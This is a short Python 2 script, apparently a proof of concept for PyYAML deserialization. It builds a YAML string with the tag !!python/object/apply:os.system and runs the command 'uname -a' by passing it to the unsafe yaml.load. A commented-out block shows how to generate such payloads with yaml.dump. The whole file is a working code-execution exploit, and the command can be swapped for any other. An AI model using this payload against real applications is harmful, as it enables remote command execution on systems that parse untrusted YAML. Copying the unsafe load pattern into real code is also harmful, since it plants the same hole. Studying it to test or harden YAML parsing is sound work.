# !/usr/bin/env python
#  -*- coding: utf-8 -*-
import yaml

exp = """---!!python/object/apply:os.system
args:['uname -a']
"""
import os


# class EXP():
#     def __init__(self,arg):
#         os.system(arg)
#
#
# print yaml.dump(EXP('uname -a'))

print yaml.load(exp)
